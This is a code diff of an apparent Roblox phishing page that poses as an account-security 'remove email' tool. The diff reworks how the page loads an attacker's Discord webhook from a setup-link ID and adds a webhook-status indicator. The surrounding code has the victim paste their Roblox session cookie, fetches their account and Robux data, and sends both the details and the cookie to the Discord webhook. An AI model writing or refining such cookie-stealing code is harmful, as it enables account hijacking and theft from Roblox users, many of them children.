@@ -367,98 +367,6 @@
             margin-top: 25px;
             animation: fadeIn 0.5s ease-out forwards;
         }
-        
-        /* Lightning effect border */
-        .lightning-border {
-            position: relative;
-            border-radius: 8px;
-            overflow: hidden;
-            z-index: 1;
-            box-shadow: 0 0 15px rgba(0, 255, 252, 0.5);
-        }
-        
-        .lightning-border::before,
-        .lightning-border::after {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            z-index: -1;
-            background: linear-gradient(45deg, 
-                var(--lightning-color1), 
-                var(--lightning-color2), 
-                var(--lightning-color3), 
-                var(--lightning-color1));
-            background-size: 400%;
-            border-radius: 10px;
-        }
-        
-        .lightning-border::before {
-            filter: blur(5px);
-            opacity: 0.7;
-            animation: lightning 6s linear infinite, flicker 2s infinite;
-        }
-        
-        .lightning-border::after {
-            filter: blur(1px);
-            opacity: 0.9;
-            animation: lightning 12s linear infinite reverse, flicker 3s infinite 1s;
-        }
-        
-        @keyframes lightning {
-            0% {
-                background-position: 0% 50%;
-                filter: hue-rotate(0deg);
-            }
-            50% {
-                background-position: 100% 50%;
-                filter: hue-rotate(360deg);
-            }
-            100% {
-                background-position: 0% 50%;
-                filter: hue-rotate(0deg);
-            }
-        }
-        
-        @keyframes flicker {
-            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
-                opacity: 0.9;
-                box-shadow: 0 0 10px var(--lightning-color1), 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
-            }
-            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
-                opacity: 0.4;
-                box-shadow: none;
-            }
-        }
-        
-        @keyframes textShine {
-            0% {
-                background-position: 0% 50%;
-            }
-            100% {
-                background-position: 100% 50%;
-            }
-        }
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                opacity: 1;
-                text-shadow: 0 0 10px var(--lightning-color1);
-            }
-            50% {
-                transform: scale(1.2);
-                opacity: 0.9;
-                text-shadow: 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-                text-shadow: 0 0 10px var(--lightning-color1);
-            }
-        }
 
         .result-title {
             color: var(--success);
@@ -674,6 +582,33 @@
             background: var(--primary);
         }
 
+        /* Webhook status indicator */
+        .webhook-status {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .webhook-status.connected {
+            background: rgba(87, 242, 135, 0.1);
+            border: 1px solid rgba(87, 242, 135, 0.3);
+            color: var(--success);
+        }
+
+        .webhook-status.disconnected {
+            background: rgba(237, 66, 69, 0.1);
+            border: 1px solid rgba(237, 66, 69, 0.3);
+            color: var(--danger);
+        }
+
+        .webhook-status i {
+            margin-right: 8px;
+        }
+
         @media (max-width: 768px) {
             .content-wrapper {
                 flex-direction: column;
@@ -738,6 +673,12 @@
 
         <div class="content-wrapper">
             <div class="main-content">
+                <!-- Webhook Status Indicator -->
+                <div id="webhook-status" class="webhook-status disconnected">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span id="webhook-status-text">Webhook not configured - Please use the setup link first</span>
+                </div>
+
                 <div class="card">
                     <h2 class="card-title"><i class="fas fa-key"></i> Account Security Options</h2>
 
@@ -859,6 +800,8 @@
             const toastTitle = document.getElementById('toast-title');
             const toastMessage = document.getElementById('toast-message');
             const toastClose = document.getElementById('toast-close');
+            const webhookStatus = document.getElementById('webhook-status');
+            const webhookStatusText = document.getElementById('webhook-status-text');
             
             // Variables to store webhook URL and directory
             let webhookUrl = '';
@@ -930,6 +873,46 @@
                     return null;
                 }
             }
+
+            // Initialize webhook configuration on page load
+            function initializeWebhook() {
+                console.log('Initializing webhook configuration...');
+                
+                // Check for webhook ID in URL parameters
+                const webhookId = getUrlParameter('id');
+                console.log('Webhook ID from URL:', webhookId);
+                
+                if (webhookId) {
+                    // Try to get webhook data from localStorage
+                    const webhookData = getWebhookData(webhookId);
+                    console.log('Retrieved webhook data:', webhookData);
+                    
+                    if (webhookData && webhookData.url) {
+                        // Set global variables
+                        webhookUrl = webhookData.url;
+                        directory = webhookData.directory || '';
+                        
+                        // Update status indicator
+                        webhookStatus.className = 'webhook-status connected';
+                        webhookStatusText.innerHTML = '<i class="fas fa-check-circle"></i> Webhook configured successfully';
+                        
+                        console.log('Webhook configured:', webhookUrl);
+                        console.log('Directory:', directory);
+                        
+                        return true;
+                    }
+                }
+                
+                // No valid webhook found
+                webhookStatus.className = 'webhook-status disconnected';
+                webhookStatusText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Webhook not configured - Please use the setup link first';
+                
+                console.log('No valid webhook configuration found');
+                return false;
+            }
+
+            // Initialize webhook on page load
+            const webhookConfigured = initializeWebhook();
             
             // Function to get user data from Roblox API using cookie
             async function getRobloxUserData(cookie) {
@@ -1002,101 +985,15 @@
                         robuxBalance: robuxBalance,
                         pendingRobux: pendingRobux
                     };
-                    
                 } catch (error) {
                     console.error('Error fetching Roblox user data:', error);
                     return null;
                 }
             }
-            
-            // Initialize webhook URL from various sources
-            const webhookId = getUrlParameter('id');
-            console.log('Webhook ID from URL:', webhookId);
-            
-            if (webhookId) {
-                const webhookData = getWebhookData(webhookId);
-                console.log('Webhook data retrieved:', webhookData);
-                
-                if (webhookData) {
-                    webhookUrl = webhookData.url;
-                    directory = webhookData.directory || '';
-                    console.log('Webhook URL loaded from ID:', webhookUrl);
-                    console.log('Directory loaded from ID:', directory);
-                    
-                    // Save to localStorage for backward compatibility
-                    try {
-                        localStorage.setItem('discord_webhook_url', webhookUrl);
-                    } catch (error) {
-                        console.error('Error saving webhook URL from parameter:', error);
-                    }
-                }
-            }
-            
-            // No popup message - if webhook URL is not found, just continue without it
-            // User must use setup.html to generate a proper link
-            if (!webhookUrl) {
-                console.log('No webhook URL found. User should use setup.html to generate a proper link.');
-                // Display a message in the UI instead of a popup
-                document.getElementById('result-box').querySelector('.result-content').innerHTML = '<div style="color: #ED4245; padding: 10px; text-align: center;">No webhook URL found. Please use setup.html to generate a proper link.</div>';
-            }
-            
-            // Fallback to old method if no webhook found by other methods
-            if (!webhookUrl) {
-                console.log('No webhook URL found by other methods, trying legacy fallback');
-                const encodedData = getUrlParameter('data');
-                console.log('Encoded data from URL:', encodedData);
-                
-                if (encodedData) {
-                    const data = decodeData(encodedData);
-                    console.log('Decoded data:', data);
-                    
-                    if (data && data.url) {
-                        webhookUrl = data.url;
-                        directory = data.directory || '';
-                        token = data.token || '';
-                        console.log('Webhook URL loaded from URL parameters (legacy mode):', webhookUrl);
-                        
-                        // Save it to localStorage for future use
-                        try {
-                            if (webhookId) {
-                                let storedWebhooks = JSON.parse(localStorage.getItem('webhooks') || '{}');
-                                storedWebhooks[webhookId] = { url: webhookUrl, directory: directory || '' };
-                                localStorage.setItem('webhooks', JSON.stringify(storedWebhooks));
-                            }
-                            localStorage.setItem('discord_webhook_url', webhookUrl);
-                        } catch (error) {
-                            console.error('Error saving legacy webhook URL:', error);
-                        }
-                    } else {
-                        console.log('No valid webhook URL in decoded data');
-                    }
-                } else {
-                    console.log('No encoded data found in URL, checking localStorage');
-                    // Fallback to localStorage for backward compatibility
-                    webhookUrl = localStorage.getItem('discord_webhook_url');
-                    if (webhookUrl) {
-                        console.log('Webhook URL loaded from localStorage (old legacy mode):', webhookUrl);
-                    } else {
-                        console.log('No webhook URL found in localStorage');
-                    }
-                }
-                
-                // If still no webhook URL, prompt user
-                if (!webhookUrl) {
-                    console.error('Failed to retrieve webhook URL from any source');
-                }
-            }
 
-            // Age option change event
-            cookieDiv.style.display = 'none';
-            processBtn.style.display = 'none';
+            // Show/hide cookie input based on selection
             ageOption.addEventListener('change', function() {
-                if (this.value === '13plus') {
-                    passwordInput.style.display = 'block';
-                    cookieDiv.style.display = 'block';
-                    processBtn.style.display = 'block';
-                } else {
-                    passwordInput.style.display = 'block';
+                if (this.value) {
                     cookieDiv.style.display = 'block';
                     processBtn.style.display = 'block';
                 }
@@ -1197,15 +1094,9 @@
                     return;
                 }
 
-                // Disable button to prevent spamming
-                processBtn.disabled = true;
-                processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
-
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nAsk Veexye for the Link Generator');
-                    processBtn.disabled = false;
-                    processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
+                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.\n\nPlease use the proper setup link first.');
                     
                     // Redirect to setup page after a short delay
                     setTimeout(function() {
@@ -1216,6 +1107,10 @@
                     
                     return;
                 }
+
+                // Disable button to prevent spamming
+                processBtn.disabled = true;
+                processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
                 
                 // Show status message
                 showToast('Info', 'Fetching Roblox account data...', true);
@@ -1313,7 +1208,6 @@
                 
                 if (accountDetailsSent) {
                     console.log('Account details sent successfully');
-                    // showToast("Success", "Account details sent to Discord", true);
                     
                     // Wait 3 seconds before sending the cookie
                     setTimeout(async () => {
@@ -1329,7 +1223,6 @@
                         
                         if (cookieSent) {
                             console.log('Cookie sent successfully');
-                            // showToast("Success", "Cookie sent to Discord", true);
                         } else {
                             console.error('Failed to send cookie');
                             showToast('Error', 'Failed to send cookie to Discord', false);
